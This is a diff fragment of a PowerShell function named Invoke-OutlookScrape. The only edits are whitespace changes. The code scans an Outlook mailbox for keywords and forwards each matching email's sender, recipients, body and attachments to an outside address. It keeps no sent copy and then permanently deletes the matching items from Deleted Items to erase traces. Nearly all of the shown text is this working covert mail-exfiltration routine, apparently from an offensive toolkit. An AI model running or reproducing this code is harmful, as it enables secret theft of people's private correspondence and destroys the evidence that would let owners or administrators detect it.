@@ -70,35 +70,35 @@ function Invoke-OutlookScrape {
         $items | ForEach-Object {
             $email = $_
             $foundKeywords = $keywords | Where-Object { $email.Subject -like "*$_*" -or $email.Body -like "*$_*" }
-        
+
             if ($foundKeywords) {
                 $subject = $email.Subject
                 $sender = $email.SenderEmailAddress
                 $recipients = $email.To | ForEach-Object { $_.Address }
                 $body = $email.Body
-            
+
                 $forwardEmail = $outlook.CreateItem(0)
                 $forwardEmail.Subject = "Matching Email Information: $subject"
                 $forwardEmail.Body = "Sender: $sender`nRecipients: $recipients`n`n$body"
                 $forwardEmail.To = $forwardToEmail
                 $forwardEmail.DeleteAfterSubmit = $true
-            
+
                 $email.Attachments | ForEach-Object {
                     $attachment = $_
                     $tempPath = Join-Path -Path $env:TEMP -ChildPath $attachment.FileName
                     $attachment.SaveAsFile($tempPath)
                     $forwardEmail.Attachments.Add($tempPath)
                 }
-            
+
                 $forwardEmail.Send()
-            
+
                 if ($forwardEmail.Attachments) {
                     $forwardEmail.Attachments | ForEach-Object { $_.Delete() }
                 }
-            
+
                 Write-Host "Matching email found. Forwarded the email information to $forwardToEmail"
                 Start-Sleep -Seconds 5
-            
+
                 $matchingItemsDeleted = $deletedItems.Items | Where-Object { $_.Subject -eq $subject }
                 $matchingItemsDeleted | ForEach-Object { $_.Delete() }
                 Write-Host "Matching emails permanently deleted from the Deleted Items folder"
